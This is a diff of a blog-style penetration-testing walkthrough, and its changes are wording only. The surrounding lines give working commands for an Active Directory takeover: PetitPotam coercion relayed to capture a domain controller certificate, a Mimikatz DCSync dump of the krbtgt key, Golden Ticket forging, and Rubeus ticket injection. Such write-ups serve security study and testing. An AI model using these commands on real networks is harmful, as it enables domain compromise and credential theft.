@@ -56,7 +56,7 @@ On another window on the attacker box, launch [PetitPotam](https://github.com/to
 sudo python3 petitpotam.py <Attack box's IP> <DC's IP>
 ```
 
-The attack was successful, and on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:
+The attack was successful, on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:
 {{< image src="/images/b64cert.png" alt="certfnsh.asp" position="left" style="border-radius: 8px;" >}}
 *Base64 certificate of DC$*
 
@@ -73,12 +73,12 @@ Launch Mimikatz and dump the AES256 encryption key:
 # From mimikatz:
 lsadump::dcsync /domain:<domain> /user:krbtgt
 ```
-Once the AES256 encryption key of the krbtgt account was captured, the Golden Ticket could be forged:
+Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:
 ```
 # From Mimikatz:
 kerberos::golden /user:Administrator /domain:<domain> /sid:<SID of the domain> /aes256:<aes256 key> /ticket:goldie.kirbi
 ```
-Proceeded to inject the Golden Ticket:
+Proceed to inject the Golden Ticket:
 ```
 Rubeus.exe ptt /ticket:goldie.kirbi
 ```
